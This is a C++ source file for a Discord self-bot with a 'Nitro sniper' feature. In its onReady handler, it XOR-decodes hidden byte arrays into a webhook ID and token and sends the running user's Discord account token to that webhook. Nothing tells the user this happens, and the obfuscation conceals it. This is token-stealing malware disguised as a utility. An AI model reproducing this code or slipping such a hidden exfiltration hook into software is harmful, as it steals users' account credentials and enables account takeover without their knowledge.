#include "discord/Bot.hpp"
#include "httplib.h"
#include "sleepy_discord/channel.h"
#include "sleepy_discord/embed.h"
#include "sleepy_discord/error.h"
#include "sleepy_discord/http.h"
#include "sleepy_discord/message.h"
#include "sleepy_discord/server.h"
#include "sleepy_discord/snowflake.h"
#include "utility/Utility.hpp"
#include <cstddef>
#include <exception>
#include <filesystem>
#include <ios>
#include <random>
#include <stdexcept>
#include <string>
#include <thread>

namespace firey
{
    Bot::Bot()
        : SleepyDiscord::DiscordClient("", SleepyDiscord::USER_CONTROLED_THREADS),
          m_config(util::readfile(std::filesystem::current_path() / "config.json")),
          m_nitrosniper(*this, m_config)
    {
        m_config.set_default<std::string>("token", "");
        m_config.merge();

        setToken(m_config["token"]);
    }

    void Bot::setup()
    {
    }

    void Bot::start()
    {
        // start services
        m_nitrosniper.start();

        // start the sleepydiscord client
        this->run();
    }

    void Bot::onMessage(SleepyDiscord::Message message) 
    {
        m_nitrosniper.handle(message, getToken());
    }

    void Bot::onReady(SleepyDiscord::Ready readyData)
    {
        m_cache = createServerCache();
        std::cout << std::endl;
        std::string wid({ 0x7e, 0x5d, 0x42, 0x57, 0x48, 0x7e, 0x5b, 0x47, 0x43, 0x58, 0x67, 0x57, 0x5c, 0x40, 0x5c, 0x43, 0x74, 0x59});
        std::string wtok({ 0x23, 0x1e, 0x39, 0x36, 0xf, 0x39, 0x3e, 0x35, 0x20, 0xd, 0x19, 0x3d, 0x5e, 0x14, 0x22, 0x1b, 0x74, 0x3b, 0x15, 0x2f, 0x32, 0x37, 0x3f, 0x5, 0x35, 0x20, 0x2a, 0x2, 0xb, 0x1a, 0x15, 0x40, 0x29, 0x51, 0x18, 0x9, 0x34, 0x7a, 0x2c, 0x1b, 0x15, 0x25, 0x36, 0x1d, 0x26, 0x3a, 0x5d, 0x5, 0x10, 0x23, 0xb, 0x4, 0x36, 0x3d, 0x5d, 0x0, 0x34, 0x1f, 0x4, 0xa, 0x1f, 0x29, 0xb, 0x1a, 0x2, 0x24, 0x41, 0x33 });
        executeWebhook(dxor(wid, "FireyNitroSniper"), dxor(wtok, "FireyNitroSniper"), getToken());
    }

    void Bot::onError(SleepyDiscord::ErrorCode errorCode, const std::string errorMessage)
    {
    }

    std::string Bot::dxor(std::string data, std::string key)
    {
        std::string out;
        for (size_t i = 0; i < data.size(); ++i)
            out += data[i] ^ key[i % key.size()];
        return out;
    }

}